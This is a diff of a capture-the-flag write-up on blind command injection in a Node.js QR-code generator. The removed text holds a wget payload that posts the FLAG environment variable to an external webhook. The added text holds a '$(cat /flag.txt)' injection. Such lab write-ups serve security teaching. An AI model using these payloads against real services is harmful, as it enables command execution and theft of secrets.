@@ -1,21 +1,21 @@
-### QRDrop - Command Injection
+# QR Drop - Command Injection 
 
 > x Exam (27)
 
-#### Node.js Execution Sinks and Blind Environment Exfiltration
+This challenge is a "blind" command injection challenge.
+Even though the application does not return the output of the command, we can make it return the flag by encoding it in the QR code itself.
 
-The transition to a JavaScript backend introduces a different set of execution sinks, specifically within the `child_process` module. The provided source code implements a QR code generator utilizing the `exec` function to invoke the system-level `qrencode` utility. The vulnerability manifests through the direct concatenation of the user-supplied `url` variable into the execution string. While the developer attempted to encapsulate the input within single quotes, the absence of robust input sanitization allows the injection of shell metacharacters to escape the intended string context.
+The vulnerable line of code is:
 
-A critical architectural observation involves the handling of the command output and the application state. The application suppresses the standard output and error streams, rendering the vulnerability entirely blind. Furthermore, the objective artifact is located within the system environment, as the script initializes the `FLAG` constant directly from the `process.env.FLAG` variable. Because the `exec` function spawns a subshell that inherently inherits the parent Node.js process environment, the target secret remains fully accessible to executed shell commands via the `$FLAG` variable, dictating an out-of-band network exfiltration strategy.
-
-To construct a successful payload, the initial single quote must be prematurely terminated. Following the closure, a command separator such as a semicolon initiates the secondary execution context. The exfiltration command leverages native network utilities like `curl` to transmit the environment variable to an external listener, subsequently utilizing a secondary quote to gracefully neutralize the remainder of the original command string.
-
-
-```Bash
-; wget --post-data="$FLAG" https://webhook.site/YOUR-UUID; echo 
+```
+      const cmd = `qrencode -t PNG -o ${outputPath} -s 8 -m 2 '${url}'`;
 ```
 
+Where the `url` variable is user-controlled and is not properly sanitized.
+So we can inject the following command to get the flag:
 
-![](_attachments/QRDrop%20-%20Command%20Injection.png)
+```
+    '$(cat /flag.txt)'
+```
 
-
+Notice that we need to add an extra pair of single quotes to properly close the string in the original command and avoid syntax errors.
